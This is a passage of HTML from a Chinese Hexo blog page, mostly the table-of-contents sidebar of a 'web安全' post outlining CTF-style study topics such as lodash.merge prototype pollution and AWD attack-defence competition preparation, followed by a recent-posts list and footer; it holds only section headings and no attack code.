href="#2%EF%BC%89%E4%BE%8B%E9%A2%98-lodash-merge%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-21-36"><span class="toc-number">15.0.2.1.2.</span> <span class="toc-text">2）例题:lodash.merge原型链污染 21:36</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AWD%E6%AF%94%E8%B5%9B%E5%85%A5%E9%97%A8"><span class="toc-number">15.0.3.</span> <span class="toc-text">AWD比赛入门</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%EF%BC%8CAWD%E6%AF%94%E8%B5%9B"><span class="toc-number">16.</span> <span class="toc-text">九，AWD比赛</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-AWD%E6%AF%94%E8%B5%9B%E7%AE%80%E4%BB%8B%E4%B8%8E%E6%AF%94%E8%B5%9B%E5%BD%A2%E5%BC%8F-00-23"><span class="toc-number">16.0.0.1.</span> <span class="toc-text">**1. AWD比赛简介与比赛形式 **00:23</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AFAWD-00-26"><span class="toc-number">16.0.0.1.1.</span> <span class="toc-text">**1）什么是AWD **00:26</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89AWD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%AF%94%E8%B5%9B%E8%A7%84%E5%88%99-05-00"><span class="toc-number">16.0.0.1.2.</span> <span class="toc-text">**2）AWD常见的比赛规则 **05:00</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#check%E6%9C%BA%E5%88%B6-%E6%9C%89%E4%B8%93%E9%97%A8%E6%9C%8D%E5%8A%A1%E9%AA%8C%E8%AF%81%E5%8A%9F%E8%83%BD%E5%8F%AF%E7%94%A8%E6%80%A7-%E5%8A%9F%E8%83%BD%E5%BC%82%E5%B8%B8%E4%BC%9A%E8%A2%AB%E6%89%A3%E5%88%86%EF%BC%88%E5%A6%82%E6%B3%A8%E5%86%8C-%E7%99%BB%E5%BD%95%E5%8A%9F%E8%83%BD%E5%A4%B1%E6%95%88%EF%BC%89"><span class="toc-number">17.</span> <span class="toc-text">check机制:  - 有专门服务验证功能可用性  - 功能异常会被扣分（如注册&#x2F;登录功能失效）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#3%EF%BC%89AWD%E7%9A%84%E5%88%9D%E5%A7%8B%E8%B5%84%E6%BA%90-12-28"><span class="toc-number">17.0.0.0.1.</span> <span class="toc-text">**3）AWD的初始资源 **12:28</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-AWD-Plus%E7%AE%80%E4%BB%8B-15-48"><span class="toc-number">17.0.0.1.</span> <span class="toc-text">**2. AWD Plus简介 **15:48</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AFAWD-plus-15-54"><span class="toc-number">17.0.0.1.1.</span> <span class="toc-text">**1）什么是AWD plus **15:54</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81AWD%E6%AF%94%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%AF%B9%E6%8A%97%E6%8A%80%E5%B7%A7-00-00"><span class="toc-number">17.0.1.</span> <span class="toc-text">**一、AWD比赛中的对抗技巧 **00:00</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%86%85%E5%AE%B9%E7%9B%AE%E5%BD%95-00-04"><span class="toc-number">17.0.1.1.</span> <span class="toc-text">**1. 内容目录 **00:04</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%B5%9B%E5%89%8D%E5%87%86%E5%A4%87-00-13"><span class="toc-number">17.0.1.2.</span> <span class="toc-text">**2. 赛前准备 **00:13</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E8%84%9A%E6%9C%AC%E7%8E%AF%E5%A2%83-01-04"><span class="toc-number">17.0.1.2.1.</span> <span class="toc-text">**1）脚本环境 **01:04</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E5%B7%A5%E5%85%B7-04-06"><span class="toc-number">17.0.1.2.2.</span> <span class="toc-text">**2）工具 **04:06</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7-04-21"><span class="toc-number">18.</span> <span class="toc-text">**代码审计工具 **04:21</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#3%EF%BC%89exploit%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%84%9A%E6%9C%AC%E6%A1%86%E6%9E%B6-07-06"><span class="toc-number">18.0.0.0.1.</span> <span class="toc-text">**3）exploit及相关脚本框架 **07:06</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%B5%9B%E4%B8%AD%E5%AF%B9%E6%8A%97-10-31"><span class="toc-number">18.0.0.1.</span> <span class="toc-text">**3. 赛中对抗 **10:31</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E5%A4%87%E4%BB%BD-10-52"><span class="toc-number">18.0.0.1.1.</span> <span class="toc-text">**1）备份 **10:52</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E6%B5%81%E9%87%8F%E8%AE%B0%E5%BD%95-12-09"><span class="toc-number">18.0.0.1.2.</span> <span class="toc-text">**2）流量记录 **12:09</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%EF%BC%89%E5%90%8E%E9%97%A8%E6%9F%A5%E6%9D%80-12-52"><span class="toc-number">18.0.0.1.3.</span> <span class="toc-text">**3）后门查杀 **12:52</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4%EF%BC%89%E6%94%BB%E5%87%BB-14-46"><span class="toc-number">18.0.0.1.4.</span> <span class="toc-text">**4）攻击 **14:46</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-14-55"><span class="toc-number">19.</span> <span class="toc-text">**漏洞挖掘 **14:55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-17-08"><span class="toc-number">20.</span> <span class="toc-text">**漏洞利用 **17:08</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">20.0.1.</span> <span class="toc-text">****</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/27/web%E5%AE%89%E5%85%A8/" title="web安全"><img src="/images/980.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web安全"/></a><div class="content"><a class="title" href="/2025/11/27/web%E5%AE%89%E5%85%A8/" title="web安全">web安全</a><time datetime="2025-11-27T08:57:36.000Z" title="发表于 2025-11-27 16:57:36">2025-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/26/hello-world/" title="Hello World"><img src="/images/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2025/11/26/hello-world/" title="Hello World">Hello World</a><time datetime="2025-11-26T13:13:38.000Z" title="发表于 2025-11-26 21:13:38">2025-11-26</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Only0901</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>